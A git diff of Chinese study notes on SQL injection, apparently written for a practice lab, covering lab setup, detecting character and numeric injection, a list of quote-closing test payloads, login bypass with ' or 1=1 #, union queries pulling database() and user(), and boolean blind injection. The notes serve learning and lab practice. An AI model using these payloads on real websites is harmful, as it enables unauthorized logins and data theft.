@@ -3,29 +3,29 @@
 ### 关于靶场搭建
 1. php版本问题
 
-PHP版本不兼容的缘故，可以通过把PHP版本换到5.x版本解决，经过尝试最优选择应该是5.4.45版本
-因为PHP5.x版本时，php连接Mysql数据库会使用`mysql_connect()`连接，PHP7.x版本连接数据库会使用`mysqli_connect()`连接，而GitHub上的源码最近更新已经是五年前了，所以对PHP高版本会出现不兼容的情况。
+    PHP版本不兼容的缘故，可以通过把PHP版本换到5.x版本解决，经过尝试最优选择应该是5.4.45版本
+    因为PHP5.x版本时，php连接Mysql数据库会使用`mysql_connect()`连接，PHP7.x版本连接数据库会使用`mysqli_connect()`连接，而GitHub上的源码最近更新已经是五年前了，所以对PHP高版本会出现不兼容的情况。
 
-关于将`magic_quotes_gpc`改为`off`（开启`magic_quotes_gpc=on`之后，相当于使用`addslshes()`这个函数，会在单引号前加反斜线注释）以避免单引号被自动加反斜线（/）注释掉的问题，也可以通过换php版本来解决
+    关于将`magic_quotes_gpc`改为`off`（开启`magic_quotes_gpc=on`之后，相当于使用`addslshes()`这个函数，会在单引号前加反斜线注释）以避免单引号被自动加反斜线（/）注释掉的问题，也可以通过换php版本来解决
 
 2. mysql版本问题
 
-经测试低版本在查表时会出错，故直接使用最新版本即8.0.12版本即可
+    经测试低版本在查表时会出错，故直接使用最新版本即8.0.12版本即可
 
 3. 关于配置文件的问题
 
-下面这篇博客里收录一些常见问题，里面的坑全都踩过一遍
-https://blog.csdn.net/qq_43968080/article/details/103613087
+    下面这篇博客里收录一些常见问题，里面的坑全都踩过一遍
+    https://blog.csdn.net/qq_43968080/article/details/103613087
 
 4. 80端口被占用问题
 
-这个问题可能属于个别现象，但是困扰我很久，于是在此也记录下来
+    这个问题可能属于个别现象，但是困扰我很久，于是在此也记录下来
 
-第一类：被system占用，参考https://www.cnblogs.com/selier/p/9514426.html
-https://blog.csdn.net/weixin_44248000/article/details/103432778
+    第一类：被system占用，参考https://www.cnblogs.com/selier/p/9514426.html
+    https://blog.csdn.net/weixin_44248000/article/details/103432778
 
-第二类：被httpd.exe占用，参考https://blog.csdn.net/speedwaycl/article/details/49023223
-一个未经尝试的解决办法https://www.cnblogs.com/starksoft/p/9131665.html
+    第二类：被httpd.exe占用，参考https://blog.csdn.net/speedwaycl/article/details/49023223
+    一个未经尝试的解决办法https://www.cnblogs.com/starksoft/p/9131665.html
 
 ## Mysql
 
@@ -43,72 +43,158 @@ https://blog.csdn.net/weixin_44248000/article/details/103432778
 
 判断方法：
 
-1.id后加单引号，根据错误提示获取信息（**字符型注入**）
+1. id后加单引号，根据错误提示获取信息（**字符型注入**）
 
-原理是**单引号成功被数据库解析**，而无论字符型还是整型都会**因为单引号个数不匹配**而报错,无报错并不代表不存在sql注入漏洞，因为页面可能对单引号作了过滤，这时可以考虑使用**判断语句**进行注入
+    原理是**单引号成功被数据库解析**，而无论字符型还是整型都会**因为单引号个数不匹配**而报错（无报错并不代表不存在sql注入漏洞，因为页面可能对单引号作了过滤，这时可以考虑使用**判断语句**进行注入）
 
-例如访问`id=1' order by 1%23`，页面回显的sql语句是`SELECT * FROM users WHERE id='1' order by 1#'LIMIT0,1`，由于#后面的语句都会被注释掉，所以真正执行的语句是`SELECT * FROM users WHERE id='1' order by 1`
+    例如
 
-此处`%23`即为url编码中的`#`，在mysql中`#`的作用是注释符（`--+`；`--` ；`#`；均为注释符号）
+    `id=1' order by 1%23`
 
-2.1=1、1=2测试法，流程如下（**数字型注入**）
+    页面回显的sql语句是
 
-① `url?id=1`② `url?id=1 ;and 1=1`③ `url?id=1 ;and 1=2`
+    `SELECT * FROM users WHERE id='1' order by 1#'LIMIT0,1`
 
-存在注入漏洞的表现:
+    由于`#`后面的语句都会被注释掉，所以真正执行的语句是
 
-> 原理是:判断原网址是否对输入信息有过滤
+    `SELECT * FROM users WHERE id='1' order by 1`
 
-① 正常显示；② 正常显示，内容基本与①相同；③ 提示`BOF`或`EOF`（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了`on error resume next`）
+    此处`%23`即为url编码中的`#`，在mysql中`#`的作用是注释符（`--+`；`--` ；`#`；均为注释符号）
 
-不存在的表现：
-
-①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。
-
- 还可以使用特定函数来判断，比如输入`1 and version()>0`，程序返回正常，说明`version()`函数被数据库识别并执行，而`version()`函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。
-
-**数值型注入常用总结**
-??? "点击展开/收起"
-
-    and1=2--+
-
-    'and1=2--+
+2. `1=1`、`1=2`测试法，流程如下（**数字型注入**）
     
-    "and1=2--+
-    
-    )and1=2--+
-    
-    ')and1=2--+
-    
-    ")and1=2--+
-    
-    "))and1=2--+
+    ① `url?id=1`② `url?id=1 ;and 1=1`③ `url?id=1 ;and 1=2`
 
-##### `union`联合注入
+    存在注入漏洞的表现:
 
-> 利用union联合注入或其他语句来获取想要得到的信息
+    > 原理是:判断原网址是否对输入信息有过滤
 
-`ORDER BY`语句的简单应用
+    ① 正常显示；② 正常显示，内容基本与①相同；③ 提示`BOF`或`EOF`（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了`on error resume next`）
 
-`ORDER BY` 语句用于**根据指定的列对结果集进行排序**。
+    不存在的表现：
 
-在1'判断的例子中，`order by` 语句用于猜解字段数和列数，若不存在则会回显出错
+    ①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。
 
-`1' order by n--+`   ，n为指定列
+    还可以使用特定函数来判断，比如输入`1 and version()>0`，程序返回正常，说明`version()`函数被数据库识别并执行，而`version()`函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。
 
-ORDER BY 语句默认按照升序对记录进行排序，如果希望按照降序对记录进行排序，可以使用 `DESC` 关键字，例如
+    **数字型注入常用总结**
+    ??? "点击展开/收起"
 
-以字母顺序显示公司名称（Company）
+        and1=2--+
 
-`SELECT Company, OrderNumber FROM Orders ORDER BY Company`
+        'and1=2--+
+        
+        "and1=2--+
+        
+        )and1=2--+
+        
+        ')and1=2--+
+        
+        ")and1=2--+
+        
+        "))and1=2--+
 
-以逆字母顺序显示公司名称
 
-`SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC`
+##### 漏洞利用手法
 
-一些常用的联合查询语句
+1.利用 Sql 漏洞绕过登录验证
 
-`1' union select database(),user()#`
+> 利用注释符#和1=1的恒成立来绕过登陆验证
+
+一般情况下弱类型密码是很难手动爆破的，例如123
+
+但是若存在sql漏洞，在用户名中输入 `123' or 1=1 #`, 密码输入 `123' or 1=1 #`（也可空白），则可以验证成功
+
+实际执行的语句是：
+
+`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`
+
+按照 Mysql 语法，# 后面的内容会被忽略，所以实际执行的语句如下
+
+`select * from users where username='123' or 1=1 `
+
+
+在用户名中输入 `123' or '1'='1`, 密码输入 `123' or '1'='1`（不加单引号会造成语法错误），实际执行语句如下
+
+`select * from users where username='123' or '1'='1' and password='123' or '1'='1`
+
+**or条件使and两端验证结果有一个成立即可都成立，从而绕过验证，无需使用注释符**
+
+#### 其他实用语句
+
+
+1. `ORDER BY`语句的简单应用
+
+    `ORDER BY` 语句用于**根据指定的列对结果集进行排序**。
+
+    在1'判断的例子中，`order by` 语句用于猜解字段数和列数，若不存在则会回显出错
+
+    `1' order by n--+`   ，n为指定列
+
+    `ORDER BY` 语句默认按照升序对记录进行排序，如果希望按照降序对记录进行排序，可以使用 `DESC` 关键字，例如
+
+    以字母顺序显示公司名称（Company）
+
+    `SELECT Company, OrderNumber FROM Orders ORDER BY Company`
+
+    以逆字母顺序显示公司名称
+
+    `SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC`
+
+
+
+2. `INSERT INTO`语句，用于向表中插入新的行或列
+
+    - `INSERT INTO 表名称 VALUES (值1, 值2,....`
+
+    - `INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)`
+
+3. `SQL UPDATE` 语句，用于修改表中数据
+
+    - `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`
+
+4. `DELETE` 语句，用于删除表中的行
+
+    - `DELETE FROM 表名称 WHERE 列名称 = 值`
+
+    可以在不删除表的情况下删除所有的行，同时保持表的结构、属性和索引完整
+
+    - `DELETE FROM table_name`
+    - `DELETE * FROM table_name`
+
+    星号（*）是选取所有列的快捷方式。
+
+### SQL 通配符
+
+在搜索数据库中的数据时，SQL 通配符可以替代一个或多个字符。
+
+在 SQL 中，可使用以下通配符：
+
+通配符	描述
+%	代表零个或多个字符
+_	仅替代一个字符
+[charlist]	字符列中的任何单一字符
+[^charlist]或者[!charlist]	不在字符列中的任何单一字符
+
+`SELECT * FROM 表名 WHERE 列名 LIKE '[   ]'`
+
+在[  ]中，可利用通配符查找与指定值（例如123）相关的数据
+
+`123%`以123开头的数据；`%123%`包含123的数据；`_123`第一个字符后是123的数据，同理`1_2_3`
+
+### 常见注入方法
+
+#### `union`联合查询
+
+通过union和前面一条SQL语句拼接,并构造其列数与前面的SQL语句列数相同
+
+例如：`select 1,2,3 from table_name1 union select 4,5,6 from table_name2;`
+
+原查询的列数为 `1,2,3` 共三列，`union select`的列数也要为三个 即 `4,5,6`，实际可以替换为`4,database(),user()`
+
+**一些常用的联合查询语句**
+
+`1' union select database(),user()#` 这里要求原查询的列数为2
 
 - `database()`将会返回当前网站所使用的数据库名字.
 
@@ -146,77 +232,11 @@ ORDER BY 语句默认按照升序对记录进行排序，如果希望按照降�
 
 - `group_concat()`:显示所有查询到的数据
 
-##### 漏洞利用手法
 
-1.利用 Sql 漏洞绕过登录验证
-
-> 利用注释符#和1=1的恒成立来绕过登陆验证
-
-一般情况下弱类型密码是很难手动爆破的，例如123
-
-但是若存在sql漏洞，在用户名中输入 `123' or 1=1 #`, 密码输入 `123' or 1=1 #`（也可空白），则可以验证成功
-
-实际执行的语句是：
-
-`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`
-
-按照 Mysql 语法，# 后面的内容会被忽略，所以实际执行的语句如下
-
-`select * from users where username='123' or 1=1 `
-
-
-在用户名中输入 `123' or '1'='1`, 密码输入 `123' or '1'='1`（不加单引号会造成语法错误），实际执行语句如下
-
-`select * from users where username='123' or '1'='1' and password='123' or '1'='1`
-
-**or条件使and两端验证结果有一个成立即可都成立，从而绕过验证，无需使用注释符**
-
-#### 其他实用语句
-
-1.`INSERT INTO`语句，用于向表中插入新的行或列
-
-- `INSERT INTO 表名称 VALUES (值1, 值2,....`
-
-- `INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)`
-
-2.`SQL UPDATE` 语句，用于修改表中数据
-
-- `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`
-
-3.`DELETE` 语句，用于删除表中的行
-
-- `DELETE FROM 表名称 WHERE 列名称 = 值`
-
-可以在不删除表的情况下删除所有的行，同时保持表的结构、属性和索引完整
-
-- `DELETE FROM table_name`
-- `DELETE * FROM table_name`
-
-星号（*）是选取所有列的快捷方式。
-
-#### SQL 通配符
-
-在搜索数据库中的数据时，SQL 通配符可以替代一个或多个字符。
-
-在 SQL 中，可使用以下通配符：
-
-通配符	描述
-%	代表零个或多个字符
-_	仅替代一个字符
-[charlist]	字符列中的任何单一字符
-[^charlist]或者[!charlist]	不在字符列中的任何单一字符
-
-`SELECT * FROM 表名 WHERE 列名 LIKE '[   ]'`
-
-在[  ]中，可利用通配符查找与指定值（例如123）相关的数据
-
-`123%`以123开头的数据；`%123%`包含123的数据；`_123`第一个字符后是123的数据，同理`1_2_3`
-
-### 常见注入方法
 
 #### 布尔盲注
 
-布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回`True` 或者 `false`，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息
+布尔盲注一般适用于页面没有回显字段(**不支持联合查询**)，且web页面返回`True` 或者 `false`，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息
 
     ascii() 函数，返回字符ascii码值
         参数 : str单字符
@@ -259,7 +279,7 @@ _	仅替代一个字符
 
     （11）求字段内容对应的ASCII
 
-   步骤非常繁琐
+   ~~步骤非常繁琐，当然大家都不手注~~
 
 ##### 相关sql语句
 
